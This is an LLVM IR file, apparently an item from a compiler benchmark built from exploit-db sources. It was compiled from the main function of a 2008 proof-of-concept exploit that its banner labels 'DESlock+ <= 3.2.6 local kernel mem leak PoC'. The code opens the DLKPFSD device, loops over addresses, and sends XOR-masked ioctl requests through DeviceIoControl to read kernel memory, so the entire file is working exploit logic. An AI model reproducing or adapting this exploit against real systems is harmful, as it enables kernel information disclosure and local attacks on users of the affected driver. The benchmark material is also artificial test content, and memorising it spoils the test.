; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_5141.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_5141.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ioctl_req = type { i32, i8**, i32 }

@.str = private unnamed_addr constant [122 x i8] c"DESlock+ <= 3.2.6 local kernel mem leak PoC\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"\\\\.\\DLKPFSD_Device\00", align 1
@FILE_EXECUTE = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"* CreateFileA failed, %d\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@UINT_MAX = common dso_local global i32 0, align 4
@DLMFENC_FLAG = common dso_local global i32 0, align 4
@DLMFENC_IOCTL = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [26 x i8] c"* DeviceIoControl failed\0A\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"%d..\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.ioctl_req, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @FILE_EXECUTE, align 4
  %13 = load i32, i32* @FILE_SHARE_READ, align 4
  %14 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %15 = or i32 %13, %14
  %16 = load i32, i32* @OPEN_EXISTING, align 4
  %17 = call i64 @CreateFileA(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 %12, i32 %15, i32* null, i32 %16, i32 0, i32* null)
  store i64 %17, i64* %9, align 8
  %18 = load i64, i64* %9, align 8
  %19 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %20 = icmp eq i64 %18, %19
  br i1 %20, label %21, label %27

21:                                               ; preds = %2
  %22 = load i32, i32* @stderr, align 4
  %23 = load i64, i64* %9, align 8
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i64 %23)
  %25 = load i32, i32* @EXIT_FAILURE, align 4
  %26 = call i32 @exit(i32 %25) #3
  unreachable

27:                                               ; preds = %2
  %28 = call i32 @memset(%struct.ioctl_req* %6, i32 0, i32 24)
  store i32 0, i32* %7, align 4
  br label %29

29:                                               ; preds = %62, %27
  %30 = load i32, i32* %7, align 4
  %31 = load i32, i32* @UINT_MAX, align 4
  %32 = icmp sle i32 %30, %31
  br i1 %32, label %33, label %65

33:                                               ; preds = %29
  %34 = load i32, i32* @DLMFENC_FLAG, align 4
  %35 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %6, i32 0, i32 2
  store i32 %34, i32* %35, align 8
  %36 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %6, i32 0, i32 0
  store i32 3, i32* %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = sext i32 %37 to i64
  %39 = inttoptr i64 %38 to i8*
  %40 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %6, i32 0, i32 1
  %41 = load i8**, i8*** %40, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  store i8* %39, i8** %42, align 8
  %43 = call i32 @xor_mask_req(%struct.ioctl_req* %6)
  %44 = load i64, i64* %9, align 8
  %45 = load i32, i32* @DLMFENC_IOCTL, align 4
  %46 = call i32 @DeviceIoControl(i64 %44, i32 %45, %struct.ioctl_req* %6, i32 24, %struct.ioctl_req* %6, i32 24, i32* %8, i32 0)
  store i32 %46, i32* %10, align 4
  %47 = load i32, i32* %10, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %54, label %49

49:                                               ; preds = %33
  %50 = load i32, i32* @stderr, align 4
  %51 = call i32 (i32, i8*, ...) @fprintf(i32 %50, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  %52 = load i32, i32* @EXIT_FAILURE, align 4
  %53 = call i32 @exit(i32 %52) #3
  unreachable

54:                                               ; preds = %33
  %55 = load i32, i32* %7, align 4
  %56 = srem i32 %55, 64
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %61, label %58

58:                                               ; preds = %54
  %59 = load i32, i32* %7, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 %59)
  br label %61

61:                                               ; preds = %58, %54
  br label %62

62:                                               ; preds = %61
  %63 = load i32, i32* %7, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %7, align 4
  br label %29

65:                                               ; preds = %29
  %66 = load i64, i64* %9, align 8
  %67 = call i32 @CloseHandle(i64 %66)
  %68 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %68
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @CreateFileA(i8*, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(%struct.ioctl_req*, i32, i32) #1

declare dso_local i32 @xor_mask_req(%struct.ioctl_req*) #1

declare dso_local i32 @DeviceIoControl(i64, i32, %struct.ioctl_req*, i32, %struct.ioctl_req*, i32, i32*, i32) #1

declare dso_local i32 @CloseHandle(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
